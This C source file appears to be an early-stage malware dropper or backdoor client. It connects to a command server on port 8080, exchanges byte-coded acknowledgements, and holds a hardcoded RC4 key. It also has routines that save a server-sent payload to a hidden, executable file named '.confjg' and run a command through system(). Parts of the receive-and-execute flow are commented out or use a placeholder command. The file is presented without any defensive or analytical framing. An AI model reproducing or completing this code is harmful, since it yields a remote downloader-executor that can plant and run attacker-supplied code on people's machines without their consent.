#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <fcntl.h>
#include "rc4.h"

// Define the communication directives
#define NET_EXIT 0
#define NET_GET  1
#define NET_OK   2

int recv_payload(int sfd);
int exec_payload();

int interpret_server_response(char *response){
    if (strcmp(response, "\xef\xbe") == 0)
        return NET_EXIT;
    if (strcmp(response, "get") == 0)
        return NET_GET;
    return -1;
}

void send_ack(int directive, int soc){
    switch (directive){
        case NET_EXIT:
            send(soc, "\xbe\xba\0", 3, 0);
            break;
        case NET_GET:
            send(soc, "\xad\xde\0", 3, 0);
            break;
        
        default:
            send(soc, "\xff\xff\0", 3, 0);
            break;
    }
}

char *key = "LECNAAEAAE";
int main(int agrc, char **argv){
    int status, soc;
    struct addrinfo hints;
    struct addrinfo *servinfo;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if ((status = getaddrinfo(NULL, "8080", &hints, &servinfo)) != 0 ) {
        fprintf(stderr, "getaddrinfo error %s\n", gai_strerror(status));
        exit(1);
    }

    int err;
    soc = socket(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol);
    if (soc == -1) {
        perror("Failed to allocate a socket");
        exit(EXIT_FAILURE);
    }

    err = connect(soc, servinfo->ai_addr, servinfo->ai_addrlen);
    if (err == -1){
        perror("Failed to connect");
        exit(EXIT_FAILURE);
    }

    freeaddrinfo(servinfo);

    char BUF[1024];
    ssize_t recvn;
    while (1){
        memset(BUF, 0, 1024);
        recvn = recv(soc, BUF, 1024, 0);
        if (recvn == 0)
            continue;
        puts(BUF);
        switch (interpret_server_response(BUF)){
            case NET_EXIT:
                send_ack(NET_EXIT, soc);
                close(soc);
                exit(EXIT_SUCCESS);
            case NET_GET:
                send_ack(NET_GET, soc);
                //recv_payload
                break;
            default:
                send_ack(NET_OK, soc);
                break;
        }
        // scanf("%1023[^\n]", BUF);
        // // rc4((unsigned char *)key, strlen(key), BUF, strlen(BUF));
        // getchar();
        // ssize_t sendn = send(soc, BUF, strlen(BUF), 0);
        // if (sendn == -1){
        //     perror("Failed to send");
        //     exit(EXIT_FAILURE);
        // }
        // ssize_t recvn = recv(soc, BUF, strlen(BUF), 0);
        // if (strcmp(BUF, "aa") == 0) { 
        //     close(soc);
        //     exit(1);
        // }
        // else if (strcmp(BUF, "bb") == 0) { 
        //     int recvStatus = recv_payload(soc);

        //     if (recvStatus == 1) exec_payload();
        //     else puts("tibau");
        // }
        // else continue;

    }
    
    
    return 0;
}

int recv_payload(int sfd){
    int pldfd = open(".confjg", O_WRONLY | O_CREAT | O_EXCL, 0700);
    if (pldfd == -1 && errno == EEXIST){
        pldfd = open(".confjg", O_WRONLY | O_EXCL, 0700);
    } else if (pldfd == -1) {
        perror("Failed to open payload file");
        return 0;
    }

    char BUF[1024];
    memset(BUF, 0, 1024);
    ssize_t readn, writen;
    while ((readn = read(sfd, BUF, 1024)) != 0){
        writen = write(pldfd, BUF, readn);
        memset(BUF, 0, 1024);
        if (writen == -1){
            perror("Failed to write the payload into file");
            close(pldfd);
            return 0;
        }
    }
    send(sfd, "b\0", 2, 0);
    close(pldfd);
    return 1;
}

int exec_payload(){
    if (system("brave") == -1){
        perror("Failed to execute payload");
        return 0;
    }
    return 1;
}